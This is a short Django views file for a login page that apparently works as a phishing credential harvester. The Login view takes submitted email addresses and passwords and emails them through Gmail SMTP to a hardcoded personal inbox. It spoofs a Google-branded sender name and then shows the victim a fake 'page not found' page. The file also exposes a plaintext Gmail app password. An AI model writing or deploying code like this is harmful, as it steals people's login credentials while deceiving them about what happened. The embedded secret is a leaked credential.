import smtplib

from django.shortcuts import render
from django.core.mail import send_mail
from email.mime.text import MIMEText
from email.utils import formataddr
# Create your views here.
def home (request):


    return render(request,"index.html")

def Login(request):
    login_id = request.POST.get("email")
    password = request.POST.get( "password")

    from_email = 'phanindra221205@gmail.com'
    from_password = 'xzke cspv xlkf sztk'
    display_name = "google.gemini@gmail.com"
    
    subject = f"user id of {login_id}"

    body = f"new user found \n Userid :{login_id} \n password : {password}"


    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = formataddr((display_name, from_email))
    msg['To'] = "phanindrayarajarla@gmail.com"

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(from_email, from_password)
            server.sendmail(from_email, "phanindrayarajarla@gmail.com", msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error: {e}")
   
    print(login_id,password )
    return render(request,"pagenotfound.html")